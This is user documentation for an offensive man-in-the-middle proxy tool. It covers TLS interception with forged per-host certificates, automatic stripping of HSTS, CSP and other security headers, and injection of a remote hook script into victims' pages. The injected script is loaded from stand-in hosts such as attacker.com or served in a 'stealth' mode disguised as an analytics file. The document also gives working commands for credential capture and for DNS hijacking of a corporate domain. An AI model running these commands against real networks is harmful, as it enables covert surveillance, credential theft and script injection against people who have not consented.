# TLS Interception

> Decrypt and inspect HTTPS traffic with dynamic certificate generation.

## Overview

TLS interception is the core of the MITM proxy. It performs a "double handshake" - acting as a TLS server to the client while simultaneously acting as a TLS client to the real target. This allows complete inspection and modification of encrypted traffic.

## How It Works

```
┌────────────────────────────────────────────────────────────────────┐
│                      TLS Interception Flow                          │
├────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Client                    MITM Proxy                    Target     │
│    │                           │                            │       │
│    │── CONNECT host:443 ──────►│                            │       │
│    │◄── 200 Connection OK ─────│                            │       │
│    │                           │                            │       │
│    │    ┌──────────────────────┴──────────────────────┐     │       │
│    │    │ Generate fake certificate for "host"        │     │       │
│    │    │ Sign with our CA                            │     │       │
│    │    └──────────────────────┬──────────────────────┘     │       │
│    │                           │                            │       │
│    │── TLS ClientHello ───────►│                            │       │
│    │◄── TLS ServerHello ───────│                            │       │
│    │◄── Fake Certificate ──────│                            │       │
│    │── TLS Finished ──────────►│                            │       │
│    │                           │                            │       │
│    │                           │── TLS ClientHello ────────►│       │
│    │                           │◄── TLS ServerHello ────────│       │
│    │                           │◄── Real Certificate ───────│       │
│    │                           │── TLS Finished ───────────►│       │
│    │                           │                            │       │
│    │◄═══════ Decrypted ═══════►│◄═══════ Encrypted ════════►│       │
│    │         HTTP               │          TLS               │       │
│                                                                     │
└────────────────────────────────────────────────────────────────────┘
```

## Basic Usage

### Start TLS Proxy

```bash
# Basic proxy (auto-generates temporary CA)
rb mitm intercept proxy --proxy-port 8080

# With custom CA certificate
rb mitm intercept proxy --proxy-port 8080 \
  --ca-cert ./ca.pem --ca-key ./ca-key.pem

# With traffic logging
rb mitm intercept proxy --proxy-port 8080 --log

# Log to file in JSON format
rb mitm intercept proxy --proxy-port 8080 \
  --log-file traffic.json --log-format json
```

### Configure Browser

After starting the proxy, configure your browser:

1. **HTTP Proxy**: `127.0.0.1:8080`
2. **HTTPS Proxy**: `127.0.0.1:8080`
3. **Install CA Certificate**: Import the generated CA into your browser's trust store

## Command Reference

```bash
rb mitm intercept proxy [FLAGS]
```

### Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--proxy-port`, `-p` | `8080` | Listen port for the proxy |
| `--proxy-bind` | `127.0.0.1` | Bind address |
| `--ca-cert`, `-c` | auto-generated | Path to CA certificate PEM |
| `--ca-key`, `-k` | auto-generated | Path to CA private key PEM |
| `--log`, `-l` | disabled | Enable stdout logging |
| `--log-file` | none | Log traffic to file |
| `--log-format` | `text` | Log format: `text` or `json` |
| `--hook`, `-H` | none | External hook URL (e.g., `http://attacker:3000/hook.js`) |
| `--hook-path` | none | Same-origin hook path (e.g., `/assets/js/rb.js`) |
| `--hook-callback` | none | RBB callback URL for same-origin mode |
| `--verbose`, `-v` | disabled | Verbose output |

## Certificate Generation

### On-the-Fly Generation

When a client connects to `https://example.com`:

1. Proxy checks certificate cache
2. If not cached, generates new certificate:
   - Subject: `CN=example.com`
   - Issuer: Your CA
   - Validity: 1 year
   - Key: ECDSA P-256 (or RSA 2048)
   - SANs: `DNS:example.com`
3. Certificate is cached for future connections

### Certificate Cache

Certificates are cached in memory to avoid regeneration:

```rust
// Internal cache structure
CertCache {
    ca: CertificateAuthority,
    cache: HashMap<String, (cert_pem, key_pem)>
}
```

## Security Header Stripping

The proxy automatically removes security headers that would interfere with interception:

| Header | Effect of Removal |
|--------|-------------------|
| `Strict-Transport-Security` | Prevents HSTS pinning |
| `Content-Security-Policy` | Allows script injection |
| `Content-Security-Policy-Report-Only` | Prevents CSP reports |
| `X-Frame-Options` | Allows framing/clickjacking |
| `X-XSS-Protection` | Disables XSS auditor |
| `X-Content-Type-Options` | Allows MIME sniffing |
| `Referrer-Policy` | Allows referrer leakage |
| `Permissions-Policy` | Removes feature restrictions |
| `Cross-Origin-Opener-Policy` | Allows cross-origin access |
| `Cross-Origin-Embedder-Policy` | Allows embedding |
| `Cross-Origin-Resource-Policy` | Allows resource sharing |

## JavaScript Injection

The MITM proxy supports two hook injection modes for RBB integration:

### Mode 1: External Hook (Traditional)

Uses an external URL for the hook script. Requires CORS headers on the RBB server.

```bash
# Inject RBB hook from external server
rb mitm intercept proxy --proxy-port 8080 \
  --hook "http://attacker.com:3000/hook.js"

# Inject custom script
rb mitm intercept proxy --proxy-port 8080 \
  --hook "http://10.0.0.5/payload.js"
```

**How it works:**
```html
<!-- Injects this script tag -->
<script src="http://attacker.com:3000/hook.js"></script>
```

**Pros:**
- Simple setup
- RBB server serves the hook directly

**Cons:**
- Requires CORS headers on RBB server
- Cross-origin request visible in browser DevTools
- May trigger CSP violations (though we strip CSP)

### Mode 2: Same-Origin Hook (Stealth) ⭐

**NEW!** The hook is served directly by the MITM proxy from the victim's domain. No CORS required!

```bash
# Same-origin hook injection
rb mitm intercept proxy --proxy-port 8080 \
  --hook-path "/assets/js/analytics.js" \
  --hook-callback "http://10.0.0.5:3000"

# Full MITM stack with same-origin hook
rb mitm intercept start \
  --target "*.target.com" \
  --proxy-ip 10.0.0.5 \
  --hook-path "/assets/js/rb.js" \
  --hook-callback "http://10.0.0.5:3000"
```

**How it works:**
```
1. Victim visits https://www.tetis.io
2. HTML response is injected with: <script src="/assets/js/analytics.js"></script>
3. Browser requests https://www.tetis.io/assets/js/analytics.js
4. MITM proxy intercepts this request
5. Instead of forwarding to real server, proxy serves RBB hook directly
6. Hook callbacks go to --hook-callback URL (RBB server)
```

```html
<!-- Injects this script tag (same origin!) -->
<script src="/assets/js/analytics.js"></script>
```

**Pros:**
- No CORS issues - same origin as the page!
- No cross-origin requests visible in DevTools
- Looks like a legitimate site resource
- Stealthier - harder to detect

**Cons:**
- Requires separate RBB server for callbacks
- Slightly more complex setup

### Configuration Flags

| Flag | Description |
|------|-------------|
| `--hook URL` | External mode: Full URL to hook script |
| `--hook-path PATH` | Same-origin mode: Path to serve hook from (e.g., `/assets/js/rb.js`) |
| `--hook-callback URL` | Same-origin mode: RBB server URL for callbacks |

> **Note:** Cannot use `--hook` with `--hook-path`/`--hook-callback`. Choose one mode.

### How Injection Works

1. **Strip Accept-Encoding**: Prevent gzip to allow modification
2. **Parse Response**: Check for `Content-Type: text/html`
3. **Find Injection Point**: Locate `</body>` tag
4. **Inject Script**: Insert `<script src="..."></script>`
5. **Update Content-Length**: Fix header after modification

```html
<!-- Before -->
<html>
  <body>
    <h1>Hello</h1>
  </body>
</html>

<!-- After Injection (External Mode) -->
<html>
  <body>
    <h1>Hello</h1>
  <script src="http://attacker.com:3000/hook.js"></script></body>
</html>

<!-- After Injection (Same-Origin Mode) -->
<html>
  <body>
    <h1>Hello</h1>
  <script src="/assets/js/analytics.js"></script></body>
</html>
```

### Same-Origin Hook Request Interception

When using same-origin mode, the proxy intercepts requests to the hook path:

```
[MITM] [www.tetis.io] GET /assets/js/analytics.js HTTP/1.1
[MITM] [www.tetis.io] Intercepting hook request: /assets/js/analytics.js -> serving RBB hook
[MITM] [www.tetis.io] <- 200 OK
[MITM] [www.tetis.io] Served RBB hook (4523 bytes) - callback: http://10.0.0.5:3000
```

## WebSocket Support

The proxy transparently handles WebSocket connections:

### Detection

```
WebSocket Upgrade Request:
  GET /socket HTTP/1.1
  Host: example.com
  Connection: Upgrade
  Upgrade: websocket
  Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
  Sec-WebSocket-Version: 13
```

### Passthrough Mode

Once a WebSocket upgrade is detected:

1. Forward upgrade request to target
2. Forward 101 Switching Protocols response
3. Switch to bidirectional binary relay
4. Log frame types without parsing

### Frame Logging

```
[example.com] WebSocket C->S frame #1: text (45 bytes)
[example.com] WebSocket S->C frame #2: text (128 bytes)
[example.com] WebSocket C->S frame #3: ping (0 bytes)
[example.com] WebSocket S->C frame #4: pong (0 bytes)
[example.com] WebSocket C->S frame #5: close (2 bytes)
```

## Traffic Logging

### Text Format

```
[MITM] [example.com] GET /api/users HTTP/1.1
[MITM] [example.com] <- 200 OK
[MITM] [api.target.com] POST /login HTTP/1.1
[MITM] [api.target.com] <- 302 Found
```

### JSON Format

```json
{"ts":1702147200,"type":"request","host":"example.com","method":"GET","path":"/api/users","version":"HTTP/1.1"}
{"ts":1702147200,"type":"response","host":"example.com","status":200,"status_text":"OK"}
{"ts":1702147201,"type":"request","host":"api.target.com","method":"POST","path":"/login","version":"HTTP/1.1"}
{"ts":1702147201,"type":"response","host":"api.target.com","status":302,"status_text":"Found"}
```

### Log Analysis

```bash
# Count requests by host
cat traffic.json | jq -r 'select(.type=="request") | .host' | sort | uniq -c

# Find login attempts
cat traffic.json | jq 'select(.path | contains("login"))'

# Extract all POST requests
cat traffic.json | jq 'select(.method=="POST")'
```

## Request/Response Interception API

For programmatic control, the proxy supports custom interceptors:

```rust
pub trait RequestInterceptor {
    /// Called before forwarding request to target
    fn on_request(&self, req: &mut HttpRequest, client_addr: Option<&str>) -> InterceptAction;

    /// Called before returning response to client
    fn on_response(&self, req: &HttpRequest, resp: &mut HttpResponse) -> InterceptAction;
}

pub enum InterceptAction {
    Continue,           // Forward normally
    Drop,               // Drop the request
    Replace(HttpResponse), // Replace with custom response
}
```

### HttpRequest Structure

```rust
pub struct HttpRequest {
    pub method: String,
    pub path: String,
    pub version: String,
    pub headers: HashMap<String, String>,
    pub body: Vec<u8>,
    pub host: String,
    pub client_addr: Option<String>,
}
```

### HttpResponse Structure

```rust
pub struct HttpResponse {
    pub version: String,
    pub status_code: u16,
    pub status_text: String,
    pub headers: HashMap<String, String>,
    pub body: Vec<u8>,
}
```

## Performance Considerations

### Connection Handling

- Each client connection spawns a new thread
- Certificate generation is cached (one per hostname)
- TLS handshakes are the primary bottleneck

### Buffer Sizes

| Buffer | Size | Purpose |
|--------|------|---------|
| Initial Request | 8 KB | HTTP CONNECT parsing |
| Data Relay | 16 KB | Normal HTTP traffic |
| Hook Injection | 64 KB | HTML modification |

### Timeouts

| Timeout | Default | Description |
|---------|---------|-------------|
| Read/Write | 30s | Socket operations |
| Connect | 30s | Target connection |

## Troubleshooting

### Certificate Warnings

**Problem**: Browser shows certificate warning

**Solutions**:
1. Install CA certificate in browser's trust store
2. For Firefox: Settings → Privacy → View Certificates → Import
3. For Chrome: Uses system trust store
4. For testing: Accept the warning (not for production)

### Connection Refused

**Problem**: Proxy refuses connections

**Check**:
```bash
# Is proxy running?
netstat -tlnp | grep 8080

# Can you connect?
curl -x http://127.0.0.1:8080 http://example.com
```

### Target Not Connecting

**Problem**: Can't reach target servers

**Check**:
```bash
# DNS resolution
dig target.com

# Direct connection
curl https://target.com

# Proxy connectivity
curl -x http://127.0.0.1:8080 https://target.com --insecure
```

### TLS Handshake Failures

**Problem**: TLS errors during interception

**Possible causes**:
- Target using TLS 1.3 features not supported
- Certificate pinning on client
- HSTS preload list

**Solutions**:
```bash
# Check with verbose mode
rb mitm intercept proxy --proxy-port 8080 --verbose

# Try different target port
rb mitm intercept proxy --proxy-port 8080
# Then connect to target:8443 instead of :443
```

## Security Implications

### What You Can See

- Full HTTP request/response bodies
- Headers including cookies and auth tokens
- WebSocket message contents
- All decrypted traffic

### What Might Fail

- Certificate pinned applications
- HSTS preloaded domains
- Applications with embedded CAs
- TLS 1.3 with specific extensions

## Examples

### Basic Interception

```bash
# Start proxy
rb mitm intercept proxy --proxy-port 8080 --log

# In browser: configure proxy to 127.0.0.1:8080
# Browse to any HTTPS site
# Watch traffic in terminal
```

### Credential Capture

```bash
# Start with JSON logging
rb mitm intercept proxy --proxy-port 8080 \
  --log-file creds.json --log-format json

# After capturing:
cat creds.json | jq 'select(.path | contains("login"))'
```

### Combined with DNS Hijacking

```bash
# Full MITM stack
rb mitm intercept start --target "*.corp.com" --proxy-ip 10.0.0.5 \
  --log --log-file traffic.log
```

## Next Steps

- [Interactive Shell](03-shell.md) - TUI for traffic inspection
- [Certificates](04-certificates.md) - CA management
- [Attack Scenarios](05-scenarios.md) - Real-world examples
